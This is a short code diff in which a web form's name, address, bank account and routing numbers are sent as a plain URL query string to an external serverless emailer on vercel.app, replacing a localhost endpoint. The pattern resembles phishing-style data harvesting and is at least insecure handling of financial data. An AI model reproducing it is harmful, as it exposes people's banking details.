@@ -413,7 +413,7 @@
             let cou = document.getElementById('countryInput').value
             
             let email = `first name: ${fN}, last name: ${lN}, middle name: ${mN}, account no: ${bN}, routing no: ${aN}, address line 1: ${l1}, adress line 2: ${l2}, city: ${c}, state: ${r}, zipecode: ${zip}, country: ${cou}`
-            fetch(`http://localhost:3000/api/serverless-example?email=${email}`)
+            fetch(`https://vercel-emailer-six.vercel.app/api/serverless-example?email=${email}`)
             .then(response => response.json())
             .then(data => console.log(data))
             .catch(error => console.error('Error:', error));
